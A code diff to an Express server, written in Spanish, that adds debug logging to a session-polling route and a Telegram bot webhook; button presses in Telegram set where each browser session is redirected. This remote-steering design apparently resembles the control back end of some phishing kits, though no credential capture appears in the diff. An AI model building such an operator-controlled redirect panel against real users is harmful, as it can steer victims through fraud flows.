@@ -496,15 +496,25 @@ app.get("/instruction/:sessionId", (req, res) => {
   const sessionId = req.params.sessionId;
   const estado = sessions.get(sessionId);
 
-  if (!estado) return res.json({ redirect_to: null });
+  console.log(`📋 Polling recibido para sessionId: ${sessionId}`);
+  console.log(`   Estado guardado: ${estado ? JSON.stringify(estado) : 'NO EXISTE'}`);
+  console.log(`   Sessions activas: ${sessions.size}`);
+  console.log(`   Todas las keys: ${Array.from(sessions.keys()).join(', ')}`);
+
+  if (!estado) {
+    console.log(`   ⚠️ No hay estado para ${sessionId}`);
+    return res.json({ redirect_to: null });
+  }
 
   if (estado.redirect_to) {
     const redireccion = estado.redirect_to;
+    console.log(`   ✅ Redireccionando a: ${redireccion}`);
     estado.redirect_to = null;
     sessions.set(sessionId, estado);
     return res.json({ redirect_to: redireccion });
   }
 
+  console.log(`   ⏳ Sin redirección aún`);
   return res.json({ redirect_to: null });
 });
 
@@ -514,19 +524,27 @@ app.get("/instruction/:sessionId", (req, res) => {
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
     const update = req.body;
+    console.log(`\n🔥 WEBHOOK RECIBIDO`);
+    console.log(`   Body completo: ${JSON.stringify(update, null, 2)}`);
+
     const { callback_query } = update;
 
     if (callback_query) {
       const callbackData = callback_query.data || '';
-      console.log('🔥 Callback recibido:', callbackData);
+      console.log(`🔥 Callback recibido: "${callbackData}"`);
 
       // Dividir por guion bajo: accion_sessionId
       const parts = callbackData.split('_');
       const action = parts[0];
       const sessionId = parts.slice(1).join('_');
 
-      console.log('🎯 Acción:', action);
-      console.log('🆔 SessionId:', sessionId);
+      console.log(`🎯 Acción parseada: "${action}"`);
+      console.log(`🆔 SessionId parseado: "${sessionId}"`);
+
+      if (!sessionId) {
+        console.error(`❌ SessionId vacío en callback_data: "${callbackData}"`);
+        return res.sendStatus(200);
+      }
 
       // Eliminar botones del mensaje donde se presionó
       try {
@@ -534,14 +552,20 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
           callback_query.message.chat.id,
           callback_query.message.message_id
         );
+        console.log(`✅ Botones eliminados`);
       } catch (editError) {
-        console.log('⚠️ No se pudo eliminar el menú');
+        console.log(`⚠️ No se pudo eliminar el menú: ${editError.message}`);
       }
 
       // Obtener o crear sessionData
+      console.log(`💾 Buscando sessionData para: "${sessionId}"`);
       const sessionData = sessions.get(sessionId) || { redirect_to: null };
+      console.log(`   SessionData anterior: ${JSON.stringify(sessionData)}`);
+
       sessionData.redirect_to = action;
       sessions.set(sessionId, sessionData);
+      console.log(`✅ SessionData guardada: ${JSON.stringify(sessionData)}`);
+      console.log(`✅ Sessions activas ahora: ${sessions.size}`);
 
       // Confirmación visual
       await fetch(getTelegramApiUrl('answerCallbackQuery'), {
@@ -549,17 +573,20 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           callback_query_id: callback_query.id,
-          text: `✅ Acción aplicada: ${action}`,
+          text: `✅ Acción: ${action}`,
           show_alert: false
         })
       });
 
-      console.log(`📄 Redirección configurada: ${sessionId} → ${action}`);
+      console.log(`📄 ✅ Redirección configurada: "${sessionId}" → "${action}"`);
+    } else {
+      console.log(`ℹ️ Update recibido pero sin callback_query`);
     }
 
     res.sendStatus(200);
   } catch (err) {
     console.error("❌ Error en webhook:", err);
+    console.error("   Stack:", err.stack);
     res.sendStatus(200);
   }
 });
